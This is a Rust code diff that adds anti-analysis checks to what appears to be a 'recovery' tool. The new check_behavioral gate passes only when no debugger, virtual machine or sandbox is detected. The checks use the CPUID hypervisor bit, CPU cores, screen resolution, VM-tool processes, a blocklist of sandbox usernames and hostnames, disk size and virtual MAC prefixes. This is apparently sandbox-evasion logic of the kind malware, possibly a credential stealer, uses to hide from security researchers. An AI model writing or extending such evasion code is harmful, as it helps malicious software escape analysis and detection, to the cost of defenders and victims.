@@ -202,6 +202,43 @@ pub fn behavioral_tasks(_ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
     ]
 }
 
+pub async fn check_behavioral() -> bool {
+    let mut suspicious = false;
+
+    let debugger = collect_debugger_summary();
+    if debugger.suspicious {
+        suspicious = true;
+    }
+
+    // VM/Sandbox
+    let env = collect_environmental_summary();
+    if env.suspicious {
+        suspicious = true;
+    }
+
+    let timing = collect_timing_summary().await;
+    if timing.suspicious {
+        suspicious = true;
+    }
+
+    let syscall = inspect_syscall_anomalies();
+    if syscall.anomalies_detected {
+        suspicious = true;
+    }
+
+    let pages = inspect_page_protections();
+    if pages.anomalies_detected {
+        suspicious = true;
+    }
+
+    let step = collect_single_step_summary();
+    if step.suspicious {
+        suspicious = true;
+    }
+
+    !suspicious
+}
+
 struct DebuggerDetectionTask;
 
 #[async_trait]
@@ -349,6 +386,8 @@ fn collect_environmental_summary() -> EnvironmentalSummary {
     let mut checks = Vec::new();
     let mut suspicious = false;
 
+    use crate::recovery::helpers::anti_vm;
+
     // Check for common VM files
     let vm_files = [
         "C:\\windows\\System32\\Drivers\\Vmmouse.sys",
@@ -380,6 +419,83 @@ fn collect_environmental_summary() -> EnvironmentalSummary {
             details: Some(format!("{} GB", mem)),
         });
     }
+
+    // CPUID Hypervisor Check
+    let cpuid_vm = anti_vm::check_cpuid_hypervisor();
+    if cpuid_vm {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "CPUID Hypervisor Bit".to_string(),
+        detected: cpuid_vm,
+        details: None,
+    });
+
+    // CPU Cores Check
+    let low_cores = anti_vm::check_cpu_cores();
+    if low_cores {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "Low CPU Cores (< 2)".to_string(),
+        detected: low_cores,
+        details: None,
+    });
+
+    // Screen Resolution Check
+    let bad_res = anti_vm::check_screen_resolution();
+    if bad_res {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "Suspicious Screen Resolution".to_string(),
+        detected: bad_res,
+        details: None,
+    });
+
+    // Process Enumeration (VM Tools)
+    let vm_procs = anti_vm::check_processes();
+    if vm_procs {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "VM Tools Processes".to_string(),
+        detected: vm_procs,
+        details: None,
+    });
+
+    // Username/Hostname Blocklist
+    let bad_user = anti_vm::check_usernames();
+    if bad_user {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "Blacklisted User/Host".to_string(),
+        detected: bad_user,
+        details: None,
+    });
+
+    // Disk Size Check
+    let small_disk = anti_vm::check_disk_size();
+    if small_disk {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "Small Disk (< 60GB)".to_string(),
+        detected: small_disk,
+        details: None,
+    });
+
+    // MAC Address OUI Check
+    let bad_mac = anti_vm::check_mac_address();
+    if bad_mac {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "Virtual MAC OUI".to_string(),
+        detected: bad_mac,
+        details: None,
+    });
 
     EnvironmentalSummary { suspicious, checks }
 }
